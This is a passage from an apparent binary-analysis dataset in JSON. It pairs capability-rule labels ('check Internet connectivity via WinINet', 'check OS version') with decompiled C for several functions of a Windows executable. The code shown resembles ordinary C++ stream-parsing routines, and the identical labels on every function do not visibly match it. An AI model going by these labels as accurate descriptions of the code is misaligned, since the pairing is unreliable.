{\n                uVar15 = *puVar16;\n            }\n            puVar16 = puVar16 + 1;\n        } while (var_78h + iStack144 != puVar16);\n    }\n    if (uVar15 <= uVar21) goto code_r0x000140066f46;\n    uVar12 = var_48h & 0xffff;\n    bVar23 = var_48h == -1;\n    bVar4 = bVar23;\n    if ((var_50h_2 != NULL) && (piVar18 = var_50h_2,  bVar23)) {\ncode_r0x0001400670b8:\n        if (piVar18[2] < piVar18[3]) {\n            iVar10 = *piVar18[2];\n        }\n        else {\n            pcVar2 = *(*piVar18 + 0x48);\n            *(&stack0xffffffffffffff10 + iVar14) = 0x14006753e;\n            iVar10 = (*pcVar2)(piVar18);\n        }\n        if (iVar10 == -1) {\n            var_50h_2 = NULL;\n        }\n        bVar23 = iVar10 == -1;\n        uVar12 = 0xffffffff;\n        bVar4 = true;\n    }\n    bVar24 = var_58h == -1;\n    if ((var_60h != NULL) && (bVar24)) {\n        if (var_60h[2] < var_60h[3]) {\n            iVar10 = *var_60h[2];\n        }\n        else {\n            pcVar2 = *(*var_60h + 0x48);\n            *(&stack0xffffffffffffff10 + iVar14) = 0x140067530;\n            iVar10 = (*pcVar2)();\n        }\n        if (iVar10 == -1) {\n            var_60h = NULL;\n        }\n        bVar24 = iVar10 == -1;\n    }\n    piVar18 = var_50h_2;\n    if (bVar23 == bVar24) goto code_r0x000140066f46;\n    if ((var_50h_2 == NULL) || (!bVar4)) {\n        uVar17 = uVar12 & 0xffff;\n    }\n    else {\n        if (var_50h_2[2] < var_50h_2[3]) {\n            uVar9 = *var_50h_2[2];\n        }\n        else {\n            pcVar2 = *(*var_50h_2 + 0x48);\n            *(&stack0xffffffffffffff10 + iVar14) = 0x140067522;\n            uVar9 = (*pcVar2)(piVar18);\n        }\n        uVar17 = uVar9;\n        if (uVar9 != 0xffff) {\n            pcVar2 = *(*piVar13 + 0x40);\n            *(&stack0xffffffffffffff10 + iVar14) = 0x140067254;\n            var_68h._6_2_ = (*pcVar2)(piVar13);\n            if (piVar18[2] < piVar18[3]) {\n                uVar12 = *piVar18[2];\n            }\n            else {\n                pcVar2 = *(*piVar18 + 0x48);\n                *(&stack0xffffffffffffff10 + iVar14) = 0x140067512;\n                uVar12 = (*pcVar2)(piVar18);\n            }\n            if (uVar12 == -1) {\n                var_50h_2 = NULL;\n            }\n            goto code_r0x000140067136;\n        }\n        var_50h_2 = NULL;\n    }\n    pcVar2 = *(*piVar13 + 0x40);\n    *(&stack0xffffffffffffff10 + iVar14) = 0x140067132;\n    var_68h._6_2_ = (*pcVar2)(piVar13, uVar17);\ncode_r0x000140067136:\n    pcVar2 = *(*piVar13 + 0x30);\n    *(&stack0xffffffffffffff10 + iVar14) = 0x140067142;\n    uVar9 = (*pcVar2)(piVar13, uVar12 & 0xffff);\n    if (uVar22 == 0) goto code_r0x000140066dbe;\n    puStack136 = puStack136 & 0xffffffffffff0000 | uVar9;\n    uVar15 = 0;\n    var_70h = uStack152 * 2;\n    do {\n        while( true ) {\n            uVar8 = *(var_70h + *(noname_5 + puVar1[uVar15] * 8));\n            pcVar2 = *(*piVar13 + 0x40);\n            *(&stack0xffffffffffffff10 + iVar14) = 0x1400671d3;\n            uVar9 = (*pcVar2)(piVar13, uVar8);\n            if (var_68h._6_2_ != uVar9) break;\ncode_r0x0001400671d9:\n            uVar15 = uVar15 + 1;\n            if (uVar22 <= uVar15) goto code_r0x0001400671e2;\n        }\n        pcVar2 = *(*piVar13 + 0x30);\n        *(&stack0xffffffffffffff10 + iVar14) = 0x14006717c;\n        iVar10 = (*pcVar2)(piVar13);\n        if (puStack136 == iVar10) goto code_r0x0001400671d9;\n        uVar22 = uVar22 - 1;\n        iStack144 = uVar22 * 8;\n        puVar1[uVar15] = puVar1[uVar22];\n        var_78h[uVar15] = var_78h[uVar22];\n    } while (uVar15 < uVar22);\ncode_r0x0001400671e2:\n    if (uVar22 < 2) goto code_r0x000140066f46;\n    uVar15 = *var_78h;\n    goto code_r0x000140066ee0;\n}\n",
        "token_count": 5808
    },
    "14006985": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140069850(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4, int32_t *noname_4, int64_t noname_5, \n                  int64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n                  ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    ulong uVar4;\n    bool bVar5;\n    int16_t iVar6;\n    uint16_t uVar7;\n    int16_t iVar8;\n    int64_t *piVar9;\n    int64_t iVar10;\n    int64_t *piVar11;\n    uint8_t uVar12;\n    bool bVar13;\n    uint64_t uVar14;\n    uchar *puVar15;\n    bool bVar16;\n    uint64_t uVar17;\n    int64_t iVar18;\n    uint64_t *puVar19;\n    uint64_t uVar20;\n    int64_t *piVar21;\n    int64_t *piVar22;\n    int64_t *piVar23;\n    int64_t *arg1_00;\n    uint16_t uVar24;\n    uint64_t uVar25;\n    ulong var_8h_2;\n    int32_t iVar26;\n    uint32_t *var_bp_50h;\n    ulong uStack160;\n    uchar auStack152 [32];\n    ulong uStack120;\n    int64_t *piStack112;\n    int64_t *piStack104;\n    int64_t *piStack96;\n    int64_t *piStack88;\n    int64_t *piStack80;\n    ulong var_28h;\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    piVar11 = arg3[1];\n    piStack88 = *arg4;\n    piVar22 = arg4[1];\n    arg1_00 = *arg3;\n    uVar25 = piVar11 & 0xffffffff;\n    noname_7 = noname_7 + 0xd0;\n    uStack160 = 0x14006989d;\n    piStack96 = piVar11;\n    piStack80 = piStack88;\n    piVar9 = fcn.1400b9850(noname_7);\n    uStack160 = 0x1400698b8;\n    iVar10 = fcn.1400147b0(noname_7);\n    piVar23 = piStack96;\n    iVar10 = -iVar10;\n    puVar15 = &stack0xffffffffffffff68 + iVar10;\n    piStack88._0_1_ = piStack96 == -1;\n    piVar1 = &stack0xffffffffffffff88 + iVar10;\n    bVar16 = arg1_00 != NULL && piStack88;\n    piVar21 = piStack80;\n    bVar5 = bVar16;\n    if (bVar16) {\n        if (arg1_00[2] < arg1_00[3]) {\n            iVar8 = *arg1_00[2];\n        }\n        else {\n            piStack96 = piStack80;\n            piStack80 = piVar23;\n            pcVar3 = *(*arg1_00 + 0x48);\n            *(&stack0xffffffffffffff60 + iVar10) = 0x140069d4f;\n            iVar8 = (*pcVar3)(arg1_00);\n            piVar21 = piStack96;\n            piVar23 = piStack80;\n        }\n        piStack88._0_1_ = false;\n        if (iVar8 == -1) {\n            arg1_00 = NULL;\n            bVar5 = false;\n            piStack88._0_1_ = bVar16;\n        }\n    }\n    piStack96._0_1_ = piVar22 == -1;\n    bVar13 = piVar21 != NULL && piStack96;\n    bVar16 = piStack96;\n    if (bVar13) {\n        if (piVar21[2] < piVar21[3]) {\n            iVar8 = *piVar21[2];\n        }\n        else {\n            piStack104 = piVar23;\n            piStack96 = piStack96 & 0xffffffffffffff00 | piStack96;\n            piStack88 = piStack88 & 0xffffffffffffff00 | piStack88;\n            piStack80 = piVar21;\n            pcVar3 = *(*piVar21 + 0x48);\n            *(&stack0xffffffffffffff60 + iVar10) = 0x140069d74;\n            iVar8 = (*pcVar3)(piVar21);\n            piVar21 = piStack80;\n            piVar23 = piStack104;\n        }\n        piStack88 = NULL;\n        if (iVar8 != -1) {\n            piStack88 = piVar21;\n        }\n        bVar16 = iVar8 == -1 && bVar13;\n    }\n    piStack96 = piVar23;\n    piVar22 = piStack96;\n    if (piStack88 != bVar16) {\n        iVar8 = uVar25;\n        if (bVar5) {\n            if (arg1_00[2] < arg1_00[3]) {\n                iVar8 = *arg1_00[2];\n            }\n            else {\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack96;\n                pcVar3 = *(*arg1_00 + 0x48);\n                *(&stack0xffffffffffffff60 + iVar10) = 0x140069d9c;\n                iVar8 = (*pcVar3)(arg1_00);\n                piStack96._0_1_ = piStack80;\n            }\n            piVar22 = piStack96;\n            if (iVar8 == -1) {\n                arg1_00 = NULL;\n            }\n        }\n        noname_6 = noname_6 * 2;\n        if (noname_6 != 0) {\n            uVar14 = 0;\n            piStack80 = piStack80 & 0xffffffffffff0000 | piVar11 & 0xffff;\n            iVar18 = 0;\n            piStack96 = arg1_00;\n            piStack104 = piStack104 & 0xffffffffffffff00 | piStack96;\n            piStack112 = piVar22;\ncode_r0x000140069b91:\n            do {\n                if (**(noname_5 + iVar18 * 8) != iVar8) {\n                    pcVar3 = *(*piVar9 + 0x30);\n                    *(&stack0xffffffffffffff60 + iVar10) = 0x140069b82;\n                    iVar6 = (*pcVar3)(piVar9);\n                    if (iVar6 != iVar8) {\n                        iVar18 = iVar18 + 1;\n                        if (iVar18 == noname_6) break;\n                        goto code_r0x000140069b91;\n                    }\n                }\n                piVar1[uVar14] = iVar18;\n                iVar18 = iVar18 + 1;\n                uVar14 = uVar14 + 1;\n            } while (iVar18 != noname_6);\n            arg1_00 = piStack96;\n            piVar11 = piStack104;\n            uVar25 = piStack80 & 0xffff;\n            piVar22 = piStack112;\n            piStack96._0_1_ = piStack104;\n            if (uVar14 != 0) {\n                piStack104 = piStack112;\n                piStack96 = piStack96 & 0xffffffffffffff00 | piVar11 & 0xff;\n                piStack80 = uVar14;\n                *(&stack0xffffffffffffff60 + iVar10) = 0x140069be1;\n                piVar11 = arg1_00;\n                fcn.14009c0a0(arg1_00);\n                uVar25 = piStack80;\n                *(&stack0xffffffffffffff60 + iVar10) = 0x140069bf6;\n                iVar18 = fcn.1400147b0(piVar11);\n                uVar14 = 0;\n                iVar18 = -iVar18;\n                puVar15 = &stack0xffffffffffffff68 + iVar18 + iVar10;\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack96 & 0xff;\n                piStack96 = piStack104;\n                puVar19 = &stack0xffffffffffffff88 + iVar18 + iVar10;\n                do {\n                    uVar4 = *(noname_5 + piVar1[uVar14] * 8);\n                    *(&stack0xffffffffffffff60 + iVar18 + iVar10) = 0x140069c2d;\n                    uVar17 = sub.msvcrt.dll_wcslen(uVar4);\n                    puVar19[uVar14] = uVar17;\n                    uVar14 = uVar14 + 1;\n                } while (uVar25 != uVar14);\n                uVar25 = 0xffffffff;\n                uVar17 = 1;\n                piStack96._0_1_ = piStack80;\n                goto code_r0x000140069908;\n            }\n        }\n    }\n    piStack96 = piVar22;\n    uVar14 = 0;\n    uVar17 = 0;\n    puVar19 = NULL;\ncode_r0x000140069908:\n    do {\n        uVar24 = uVar25;\n        piStack104._0_1_ = uVar24 == 0xffff;\n        piStack80._0_1_ = arg1_00 != NULL && piStack104;\n        piStack112._0_1_ = piStack104;\n        if (piStack80) {\n            if (arg1_00[2] < arg1_00[3]) {\n                iVar8 = *arg1_00[2];\n            }\n            else {\n                piStack112 = piStack112 & 0xffffffffffffff00 | piStack96;\n                piStack104 = piStack104 & 0xffffffffffffff00 | piStack104;\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack80;\n                pcVar3 = *(*arg1_00 + 0x48);\n                *(puVar15 + -8) = 0x140069d0d;\n                iVar8 = (*pcVar3)(arg1_00);\n                piStack96._0_1_ = piStack112;\n            }\n            piStack112._0_1_ = piStack104;\n            if (iVar8 == -1) {\n                arg1_00 = NULL;\n                piStack104._0_1_ = piStack80;\n            }\n            else {\n                piStack104._0_1_ = 0;\n            }\n        }\n        uVar12 = piStack88 != NULL & piStack96;\n        if (uVar12 == 0) {\n            if (piStack104 == piStack96) break;\n        }\n        else {\n            if (piStack88[2] < piStack88[3]) {\n                iVar8 = *piStack88[2];\n                piStack80._0_1_ = piStack104;\n                piStack104._0_1_ = uVar12;\n            }\n            else {\n                uStack120._7_1_ = piStack96;\n                piStack112 = piStack112 & 0xffffffffffffff00 | piStack112;\n                piStack104 = piStack104 & 0xffffffffffffff00 | uVar12;\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack104;\n                pcVar3 = *(*piStack88 + 0x48);\n                *(puVar15 + -8) = 0x140069cdf;\n                iVar8 = (*pcVar3)();\n                piStack96._0_1_ = uStack120._7_1_;\n            }\n            if (iVar8 != -1) {\n                piStack104._0_1_ = 0;\n            }\n            piVar11 = NULL;\n            if (iVar8 != -1) {\n                piVar11 = piStack88;\n            }\n            piStack88 = piVar11;\n            if (piStack80 == piStack104) break;\n        }\n        uVar7 = uVar24;\n        if ((arg1_00 != NULL) && (piStack112 != 0)) {\n            if (arg1_00[2] < arg1_00[3]) {\n                uVar7 = *arg1_00[2];\n            }\n            else {\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack96;\n                pcVar3 = *(*arg1_00 + 0x48);\n                *(puVar15 + -8) = 0x140069cb9;\n                uVar7 = (*pcVar3)(arg1_00);\n                piStack96._0_1_ = piStack80;\n            }\n            if (uVar7 == 0xffff) {\n                arg1_00 = NULL;\n            }\n        }\n        if (uVar14 == 0) goto code_r0x000140069ae4;\n        piStack80 = piStack80 & 0xffffffffffff0000 | uVar25 & 0xffff;\n        uVar25 = 0;\n        uVar20 = 0;\ncode_r0x000140069985:\n        do {\n            if (uVar17 < puVar19[uVar25]) {\n                if (*(*(noname_5 + piVar1[uVar25] * 8) + uVar17 * 2) != uVar7) {\n                    uVar14 = uVar14 - 1;\n                    piVar1[uVar25] = piVar1[uVar14];\n                    puVar19[uVar25] = puVar19[uVar14];\n                    if (uVar14 <= uVar25) break;\n                    goto code_r0x000140069985;\n                }\n            }\n            else {\n                uVar20 = uVar20 + 1;\n            }\n            uVar25 = uVar25 + 1;\n        } while (uVar25 < uVar14);\n        uVar24 = piStack80;\n        if (uVar14 == uVar20) break;\n        if (arg1_00[2] < arg1_00[3]) {\n            arg1_00[2] = arg1_00[2] + 2;\n        }\n        else {\n            piStack80 = piStack80 & 0xffffffffffffff00 | piStack96;\n            pcVar3 = *(*arg1_00 + 0x50);\n            *(puVar15 + -8) = 0x140069b1e;\n            (*pcVar3)(arg1_00);\n            piStack96._0_1_ = piStack80;\n        }\n        uVar17 = uVar17 + 1;\n        uVar25 = 0xffffffff;\n    } while( true );\n    if (uVar14 == 1) {\n        uVar25 = *puVar19;\njoined_r0x000140069b2b:\n        if (uVar25 != uVar17) {\ncode_r0x000140069ae4:\n            *var_bp_50h = *var_bp_50h | 4;\n            goto code_r0x000140069aee;\n        }\n    }\n    else {\n        if (uVar14 != 2) goto code_r0x000140069ae4;\n        if (*puVar19 != uVar17) {\n            uVar25 = puVar19[1];\n            goto joined_r0x000140069b2b;\n        }\n    }\n    iVar2 = *piVar1;\n    if (iVar26 <= iVar2) {\n        iVar2 = iVar2 - iVar26;\n    }\n    *noname_4 = iVar2;\ncode_r0x000140069aee:\n    *arg1 = arg1_00;\n    arg1[1] = piStack96 & 0xffffffffffff0000 | uVar24;\n    return;\n}\n",
        "token_count": 3627
    },
    "14006b63": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014006c243)\n// WARNING: Removing unreachable block (ram,0x00014006b914)\n// WARNING: Removing unreachable block (ram,0x00014006b91d)\n// WARNING: Removing unreachable block (ram,0x00014006b92a)\n// WARNING: Removing unreachable block (ram,0x00014006c110)\n// WARNING: Removing unreachable block (ram,0x00014006c526)\n// WARNING: Removing unreachable block (ram,0x00014006c53b)\n// WARNING: Removing unreachable block (ram,0x00014006b933)\n// WARNING: Removing unreachable block (ram,0x00014006b93d)\n// WARNING: Removing unreachable block (ram,0x00014006c1d0)\n// WARNING: Removing unreachable block (ram,0x00014006c11e)\n// WARNING: Removing unreachable block (ram,0x00014006c12b)\n// WARNING: Removing unreachable block (ram,0x00014006b953)\n// WARNING: Removing unreachable block (ram,0x00014006b95b)\n// WARNING: Removing unreachable block (ram,0x00014006b8b4)\n// WARNING: Removing unreachable block (ram,0x00014006b8bf)\n// WARNING: Removing unreachable block (ram,0x00014006bec0)\n// WARNING: Removing unreachable block (ram,0x00014006b8c3)\n// WARNING: Removing unreachable block (ram,0x00014006b970)\n// WARNING: Removing unreachable block (ram,0x00014006b981)\n// WARNING: Removing unreachable block (ram,0x00014006b8e0)\n// WARNING: Removing unreachable block (ram,0x00014006b98a)\n// WARNING: Removing unreachable block (ram,0x00014006b99b)\n// WARNING: Removing unreachable block (ram,0x00014006b9b1)\n// WARNING: Removing unreachable block (ram,0x00014006b8e3)\n// WARNING: Removing unreachable block (ram,0x00014006b8fb)\n// WARNING: Removing unreachable block (ram,0x00014006b903)\n// WARNING: Removing unreachable block (ram,0x00014006c0d0)\n// WARNING: Removing unreachable block (ram,0x00014006c0de)\n// WARNING: Removing unreachable block (ram,0x00014006c0f6)\n// WARNING: Removing unreachable block (ram,0x00014006b906)\n// WARNING: Removing unreachable block (ram,0x00014006c1f0)\n// WARNING: Removing unreachable block (ram,0x00014006c1fe)\n// WARNING: Removing unreachable block (ram,0x00014006c4a1)\n// WARNING: Removing unreachable block (ram,0x00014006c572)\n// WARNING: Removing unreachable block (ram,0x00014006c4b4)\n// WARNING: Removing unreachable block (ram,0x00014006c4bd)\n// WARNING: Removing unreachable block (ram,0x00014006c271)\n// WARNING: Removing unreachable block (ram,0x00014006bca9)\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.14006b630(uint *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    char cVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    uint64_t uVar6;\n    ulong *arg1_00;\n    int64_t iVar7;\n    ulong *in_R8;\n    uint64_t arg3;\n    ulong *in_R9;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong uStack136;\n    uint uStack128;\n    uint uStack124;\n    ulong uStack120;\n    uint uStack112;\n    uint uStack108;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    uStack120 = *in_R8;\n    uStack112 = *(in_R8 + 1);\n    uStack108 = *(in_R8 + 0xc);\n    uStack136 = *in_R9;\n    uStack128 = *(in_R9 + 1);\n    uStack124 = *(in_R9 + 0xc);\n    fcn.1400b97f0(in_stack_00000028 + 0xd0);\n    iVar4 = fcn.14002c080(0x140108430);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + iVar4 * 8;\n    iVar7 = *piVar1;\n    if (iVar7 == 0) {\n        arg1_00 = fcn.1400bc710(0x70);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x140118850;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x21) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x6f) = 0;\n        fcn.14009fd60(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.1400a38f0(*(in_stack_00000028 + 0xd0), arg1_00, iVar4);\n        iVar7 = *piVar1;\n    }\n    iStack88 = fcn.14007b890(0, 0);\n    if (*(iVar7 + 0x20) != '\\0') {\n        fcn.14007d790(&iStack88, 0x20);\n    }\n    aiStack80[0] = fcn.14007b890(0, 0);\n    fcn.14007d790(aiStack80, 0x20);\n    iVar4 = 0;\n    uStack92 = *(iVar7 + 0x60);\n    do {\n        if (*(&uStack92 + iVar4) < 5) {\n    // WARNING: Could not recover jumptable at 0x00014006b7a5. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x14010b930\n            puVar5 = (*(*(*(&uStack92 + iVar4) * 4 + 0x14010b930) + 0x14010b930))();\n            return puVar5;\n        }\n        iVar2 = iVar4;\n        iVar4 = iVar4 + 1;\n    } while (iVar2 + 1 < 4);\n    if ((1 < *(aiStack80[0] + -0x18)) && (uVar6 = fcn.140024dd0(aiStack80, 0x30, 0),  uVar6 != 0)) {\n        arg3 = *(aiStack80[0] + -0x18);\n        if (uVar6 == 0xffffffffffffffff) {\n            uVar6 = arg3 - 1;\n        }\n        if (uVar6 <= arg3) {\n            arg3 = uVar6;\n        }\n        fcn.14007d8a0(aiStack80, 0, arg3, 0);\n    }\n    if (*(iStack88 + -0x18) != 0) {\n        fcn.14007da40(&iStack88, 0);\n        cVar3 = fcn.1400b76a0(*(iVar7 + 0x10), *(iVar7 + 0x18), &iStack88);\n        if (cVar3 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    fcn.14007c220(in_stack_00000038, aiStack80);\n    cVar3 = fcn.140029dd0(&uStack120, &uStack136);\n    if (cVar3 != '\\0') {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = uStack120;\n    arg1[1] = uStack120._4_4_;\n    arg1[2] = uStack112;\n    arg1[3] = uStack108;\n    fcn.14007bf20(aiStack80[0] + -0x18);\n    fcn.14007bf20(iStack88 + -0x18);\n    return arg1;\n}\n",
        "token_count": 2023
    },
    "14006c60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014006d213)\n// WARNING: Removing unreachable block (ram,0x00014006c8e4)\n// WARNING: Removing unreachable block (ram,0x00014006c8ed)\n// WARNING: Removing unreachable block (ram,0x00014006c8fa)\n// WARNING: Removing unreachable block (ram,0x00014006d0e0)\n// WARNING: Removing unreachable block (ram,0x00014006d4f6)\n// WARNING: Removing unreachable block (ram,0x00014006d50b)\n// WARNING: Removing unreachable block (ram,0x00014006c903)\n// WARNING: Removing unreachable block (ram,0x00014006c90d)\n// WARNING: Removing unreachable block (ram,0x00014006d1a0)\n// WARNING: Removing unreachable block (ram,0x00014006d0ee)\n// WARNING: Removing unreachable block (ram,0x00014006d0fb)\n// WARNING: Removing unreachable block (ram,0x00014006c923)\n// WARNING: Removing unreachable block (ram,0x00014006c92b)\n// WARNING: Removing unreachable block (ram,0x00014006c884)\n// WARNING: Removing unreachable block (ram,0x00014006c88f)\n// WARNING: Removing unreachable block (ram,0x00014006ce90)\n// WARNING: Removing unreachable block (ram,0x00014006c893)\n// WARNING: Removing unreachable block (ram,0x00014006c940)\n// WARNING: Removing unreachable block (ram,0x00014006c951)\n// WARNING: Removing unreachable block (ram,0x00014006c8b0)\n// WARNING: Removing unreachable block (ram,0x00014006c95a)\n// WARNING: Removing unreachable block (ram,0x00014006c96b)\n// WARNING: Removing unreachable block (ram,0x00014006c981)\n// WARNING: Removing unreachable block (ram,0x00014006c8b3)\n// WARNING: Removing unreachable block (ram,0x00014006c8cb)\n// WARNING: Removing unreachable block (ram,0x00014006c8d3)\n// WARNING: Removing unreachable block (ram,0x00014006d0a0)\n// WARNING: Removing unreachable block (ram,0x00014006d0ae)\n// WARNING: Removing unreachable block (ram,0x00014006d0c6)\n// WARNING: Removing unreachable block (ram,0x00014006c8d6)\n// WARNING: Removing unreachable block (ram,0x00014006d1c0)\n// WARNING: Removing unreachable block (ram,0x00014006d1ce)\n// WARNING: Removing unreachable block (ram,0x00014006d471)\n// WARNING: Removing unreachable block (ram,0x00014006d551)\n// WARNING: Removing unreachable block (ram,0x00014006d484)\n// WARNING: Removing unreachable block (ram,0x00014006d48d)\n// WARNING: Removing unreachable block (ram,0x00014006d51c)\n// WARNING: Removing unreachable block (ram,0x00014006d498)\n// WARNING: Removing unreachable block (ram,0x00014006d241)\n// WARNING: Removing unreachable block (ram,0x00014006cc79)\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.14006c600(uint *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    char cVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    uint64_t uVar6;\n    ulong *arg1_00;\n    int64_t iVar7;\n    ulong *in_R8;\n    uint64_t arg3;\n    ulong *in_R9;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong uStack136;\n    uint uStack128;\n    uint uStack124;\n    ulong uStack120;\n    uint uStack112;\n    uint uStack108;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    uStack120 = *in_R8;\n    uStack112 = *(in_R8 + 1);\n    uStack108 = *(in_R8 + 0xc);\n    uStack136 = *in_R9;\n    uStack128 = *(in_R9 + 1);\n    uStack124 = *(in_R9 + 0xc);\n    fcn.1400b97f0(in_stack_00000028 + 0xd0);\n    iVar4 = fcn.14002c080(0x140108440);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + iVar4 * 8;\n    iVar7 = *piVar1;\n    if (iVar7 == 0) {\n        arg1_00 = fcn.1400bc710(0x70);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x140118870;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x21) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x6f) = 0;\n        fcn.1400a0590(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.1400a38f0(*(in_stack_00000028 + 0xd0), arg1_00, iVar4);\n        iVar7 = *piVar1;\n    }\n    iStack88 = fcn.14007b890(0, 0);\n    if (*(iVar7 + 0x20) != '\\0') {\n        fcn.14007d790(&iStack88, 0x20);\n    }\n    aiStack80[0] = fcn.14007b890(0, 0);\n    fcn.14007d790(aiStack80, 0x20);\n    iVar4 = 0;\n    uStack92 = *(iVar7 + 0x60);\n    do {\n        if (*(&uStack92 + iVar4) < 5) {\n    // WARNING: Could not recover jumptable at 0x00014006c775. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x14010b91c\n            puVar5 = (*(*(*(&uStack92 + iVar4) * 4 + 0x14010b91c) + 0x14010b91c))();\n            return puVar5;\n        }\n        iVar2 = iVar4;\n        iVar4 = iVar4 + 1;\n    } while (iVar2 + 1 < 4);\n    if ((1 < *(aiStack80[0] + -0x18)) && (uVar6 = fcn.140024dd0(aiStack80, 0x30, 0),  uVar6 != 0)) {\n        arg3 = *(aiStack80[0] + -0x18);\n        if (uVar6 == 0xffffffffffffffff) {\n            uVar6 = arg3 - 1;\n        }\n        if (uVar6 <= arg3) {\n            arg3 = uVar6;\n        }\n        fcn.14007d8a0(aiStack80, 0, arg3, 0);\n    }\n    if (*(iStack88 + -0x18) != 0) {\n        fcn.14007da40(&iStack88, 0);\n        cVar3 = fcn.1400b76a0(*(iVar7 + 0x10), *(iVar7 + 0x18), &iStack88);\n        if (cVar3 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    fcn.14007c220(in_stack_00000038, aiStack80);\n    cVar3 = fcn.140029dd0(&uStack120, &uStack136);\n    if (cVar3 != '\\0') {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = uStack120;\n    arg1[1] = uStack120._4_4_;\n    arg1[2] = uStack112;\n    arg1[3] = uStack108;\n    fcn.14007bf20(aiStack80[0] + -0x18);\n    fcn.14007bf20(iStack88 + -0x18);\n    return arg1;\n}\n",
        "token_count": 2059
    },
    "14006dad": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014006e5e3)\n// WARNING: Removing unreachable block (ram,0x00014006ddc4)\n// WARNING: Removing unreachable block (ram,0x00014006ddcd)\n// WARNING: Removing unreachable block (ram,0x00014006ddda)\n// WARNING: Removing unreachable block (ram,0x00014006e630)\n// WARNING: Removing unreachable block (ram,0x00014006ea1c)\n// WARNING: Removing unreachable block (ram,0x00014006e63e)\n// WARNING: Removing unreachable block (ram,0x00014006e642)\n// WARNING: Removing unreachable block (ram,0x00014006e64d)\n// WARNING: Removing unreachable block (ram,0x00014006dde3)\n// WARNING: Removing unreachable block (ram,0x00014006ddee)\n// WARNING: Removing unreachable block (ram,0x00014006e703)\n// WARNING: Removing unreachable block (ram,0x00014006de04)\n// WARNING: Removing unreachable block (ram,0x00014006de0c)\n// WARNING: Removing unreachable block (ram,0x00014006dd64)\n// WARNING: Removing unreachable block (ram,0x00014006e35e)\n// WARNING: Removing unreachable block (ram,0x00014006dd6f)\n// WARNING: Removing unreachable block 